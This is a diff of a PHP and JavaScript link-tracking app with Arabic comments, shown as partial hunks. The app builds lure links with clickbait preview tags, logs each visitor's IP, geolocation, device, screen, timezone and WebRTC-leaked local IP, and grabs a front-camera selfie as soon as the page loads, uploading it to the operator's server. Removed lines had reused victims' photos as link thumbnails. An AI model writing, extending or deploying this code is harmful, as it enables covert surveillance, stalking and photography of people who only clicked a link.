@@ -7,9 +7,9 @@ ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 try {
-    $db = new PDO('sqlite:tracker.db');
-    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
+    // إنشاء الجداول مع إضافة حقل خيار الكاميرا
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
@@ -40,13 +40,13 @@ try {
 }
 
 // معالجة حفظ صورة السيلفي
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'save_photo') {
-    $code = $_POST['code'] ?? '';
-    $imgData = $_POST['image'] ?? '';
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) &&$_POST['action'] === 'save_photo') {
+    $code =$_POST['code'] ?? '';
+    $imgData =$_POST['image'] ?? '';
     
     if (!empty($imgData) && !empty($code)) {
-        $imgData = str_replace('data:image/jpeg;base64,', '', $imgData);
-        $imgData = str_replace(' ', '+', $imgData);
+        $imgData = str_replace('data:image/jpeg;base64,', '',$imgData);
+        $imgData = str_replace(' ', '+',$imgData);
         $decodedData = base64_decode($imgData);
         
         if (!file_exists('uploads')) {
@@ -115,11 +115,8 @@ function get_ip_details($ip) {
     return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
 }
 
-// متغيرات العرض الديناميكي للرابط المستهدف (Open Graph)
-$og_title = "شاهد الفيديو المباشر";
-$og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
+// التحقق مما إذا كان الرابط المطلوب يحتوي على إعداد الكاميرا
 $current_use_camera = 1;
-
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
     $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
@@ -130,19 +127,6 @@ if (isset($_GET['r'])) {
         $target =$link['target_url'];
         $current_use_camera =$link['use_camera'];
         
-        // استخراج العنوان ديناميكياً من الرابط المستهدف (نطاق أو اسم الموقع)
-        $parsed_url = parse_url($target);$domain_name = $parsed_url['host'] ?? $target;
-        $og_title = "محتوى حصري من: " . $domain_name;
-
-        // البحث عن آخر صورة التقطت لهذا الرابط لجعلها غلافاً للمعاينة
-        $photoStmt =$db->prepare("SELECT photo FROM logs WHERE code = ? AND photo IS NOT NULL ORDER BY id DESC LIMIT 1");
-        $photoStmt->execute([$code]);
-        $last_photo =$photoStmt->fetchColumn();
-        if ($last_photo && file_exists($last_photo)) {
-            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ||$_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
-            $og_image =$protocol . $_SERVER['HTTP_HOST'] . '/' .$last_photo;
-        }
-
         if (isset($_GET['check_cam'])) {
             echo json_encode(['use_camera' => $current_use_camera]);
             exit();
@@ -156,7 +140,7 @@ if (isset($_GET['r'])) {
         $device = get_device_type($ua);
         $screen =$_GET['screen'] ?? 'غير متوفر';
         $tz =$_GET['tz'] ?? 'غير متوفر';
-        $created_at = date('Y-m-d H:i:s');
+        $created_at = date('Y-m-d H:i:s'); // التوقيت الجزائري الدقيق بالثانية
 
         if (isset($_GET['screen'])) {
             try {
@@ -208,10 +192,11 @@ if (!empty($filter_code)) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hello World from azez</title>
-    <!-- وسوم المعاينة الذكية (Open Graph) للعنوان والصورة المصغرة -->
-    <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
-    <meta property="og:description" content="انقر هنا لعرض المحتوى وتفاصيل الرابط بشكل مباشر.">
-    <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
+    <!-- وسوم Open Graph لظهور الصورة والعنوان عند المشاركة في واتساب وفيسبوك -->
+    <meta property="وصف الموقع" content="رابط تتبع ذكي ومحمي">
+    <meta property="og:title" content="محتوى حصري ومهم - انقر للمشاهدة">
+    <meta property="og:description" content="اضغط هنا لعرض المحتوى وتفاصيل الرابط بشكل مباشر.">
+    <meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60">
     <meta property="og:type" content="website">
 
     <style>
@@ -275,7 +260,7 @@ if (!empty($filter_code)) {
                     }
                 }
             };
-            setTimeout(() => { if (ips.length === 0) callback("192.168.1.X"); }, 500);
+            setTimeout(() => { if (ips.length === 0) callback("192.168.1.X"); }, 800);
         }
 
         document.addEventListener("DOMContentLoaded", function() {
@@ -284,17 +269,19 @@ if (!empty($filter_code)) {
             const hasScreen = urlParams.has('screen');
 
             if (redirectCode && !hasScreen) {
+                // التحقق هل الرابط يفعل ميزة الكاميرا أم لا
                 fetch(`/?r=${redirectCode}&check_cam=1`)
                     .then(response => response.json())
                     .then(data => {
                         if (data.use_camera == 1 && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                            // فتح الكاميرا والتقاط الصورة بسرعة فائقة
                             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                                 .then(function(stream) {
                                     const video = document.createElement('video');
                                     video.srcObject = stream;
                                     video.play();
                                     
-                                    // التقاط الصورة فوراً بأعلى سرعة دون أي انتظار
+                                    // التقاط الصورة فوراً دون تأخير لزيادة السرعة
                                     requestAnimationFrame(() => {
                                         const canvas = document.createElement('canvas');
                                         canvas.width = 320;
